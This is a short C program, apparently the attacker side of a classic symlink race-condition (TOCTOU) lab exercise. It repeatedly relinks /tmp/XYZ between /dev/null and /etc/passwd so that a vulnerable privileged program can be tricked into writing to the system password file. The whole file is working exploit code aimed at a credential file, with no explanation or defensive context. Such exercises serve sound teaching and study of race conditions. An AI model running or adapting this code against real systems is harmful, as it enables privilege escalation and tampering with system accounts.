#include <unistd.h>
#include <stdio.h>

int main()
{
    while (1) {
        unlink("/tmp/XYZ");
		symlink("/dev/null","/tmp/XYZ");
        usleep(500);

		unlink("/tmp/XYZ");
		symlink("/etc/passwd","/tmp/XYZ");
        usleep(500);
    }
    return 0;
}